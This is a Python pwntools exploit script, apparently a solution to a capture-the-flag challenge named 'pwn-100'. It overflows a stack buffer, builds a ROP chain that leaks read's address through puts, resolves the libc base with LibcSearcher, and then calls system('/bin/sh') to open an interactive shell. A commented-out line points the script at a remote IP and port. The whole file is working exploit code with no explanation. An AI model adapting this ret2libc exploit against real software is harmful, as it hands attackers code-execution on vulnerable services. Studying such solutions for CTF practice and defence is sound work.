from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

#r = remote('111.198.29.45', 38768)
r = process('./pwn-100')
elf = ELF('./pwn-100')

read_got = elf.got['read']
puts_plt = elf.plt['puts']
main = 0x4006B8

pop_rdi = 0x400763

pay = 'A'*(0x48) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main) + 'A'*(0xc8-0x48-32)
r.send(pay)

r.recvuntil("bye~\n")
read_addr = u64(r.recv().split('\n')[0].ljust(8,'\x00'))
print hex(read_addr)

obj = LibcSearcher("read", read_addr)
libc_base = read_addr - obj.dump("read")
system = obj.dump("system") + libc_base
binsh = obj.dump("str_bin_sh") + libc_base


print hex(system)
print hex(binsh)

payload = 'a'*(0x48) + p64(pop_rdi) + p64(binsh) + p64(system)
payload = payload.ljust(200, '0')
r.send(payload)


r.interactive()



